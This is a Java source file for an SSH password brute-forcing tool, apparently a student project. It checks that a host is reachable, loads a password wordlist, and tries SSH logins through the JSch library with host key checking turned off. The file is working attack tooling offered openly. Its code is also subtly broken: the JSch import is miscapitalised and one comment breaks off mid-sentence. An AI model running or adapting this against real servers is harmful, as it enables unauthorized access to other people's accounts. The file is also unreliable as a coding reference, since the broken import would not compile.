
package sshbrute;

import java.net.Socket; 
import java.net.InetSocketAddress; 

import java.util.ArrayList; 
import java.io.FileReader; 
import java.io.BufferedReader; 

//Obsure import that is used for the 
import com.jcraft.Jsch.*; 



public class SSHBrute {

    public static void checkHost(String host, int port) {
        //This trys to get get the connected 
            try{
                System.out.print("checking host...");
                Socket checkSock; 
                checkSock = new Socket();
                //Connects to an internet socket address using the hostbanem and port
                // timeout of 1000 
                checkSock.connect(new InetSocketAddress(host,port), 1000); 
                checkSock.close(); 
                System.out.println("Successful");
                
            } catch (Exception e ){  //failure to connect to the ssh server 
                   System.out.println("Fail");
                   System.exit(1); 
            
            }
    }
    
    //This gets the file path of the wordlist needed for the attack 
    //The word list is any size 
    public static ArrayList<String> getwordList (String path){
     
         //Description of what is being done for user to see 
        System.out.println("read Wordlist");

        ArrayList<String> wordList; 
       wordList = new ArrayList<>(); 
        try{
            
            //opens a buffer to read the lines in the file specififed 
            BufferedReader buffRead = new BufferedReader(new FileReader(path));
            String line = null; 
            
            //Adds the lines of the file to the arraylist until the file is complete. IF the file is empty then it iwll fail. 
            while((line = buffRead.readLine()) != null){
                wordList.add(line);
            }
            buffRead.close(); 
            System.out.println("Done");
        } 
        catch (Exception e){ //failed to read the wordlist
         System.out.println("Fail");
         System.exit(1); 
        } 
        return wordList;
    }
    
    //Mostly used from the open source JSchDeveloper Website and just modified it to log into our ssh 
    //http://www.jcraft.com/jsch/examples/Shell.java.html
    
    public static boolean crackPass(String host, String user, String pass, int port){
        try{
            Session tryPass = new JSch().getSession(user, host, port); 
            tryPass.setPassword(pass);
            tryPass.setConfig("StrictHostKeyChecking", "no");
            tryPass.connect(30000);
            tryPass.disconnect(); 
        }
        catch(Exception e) {
               return false; 
        }
        return true; 
    }
        
    }
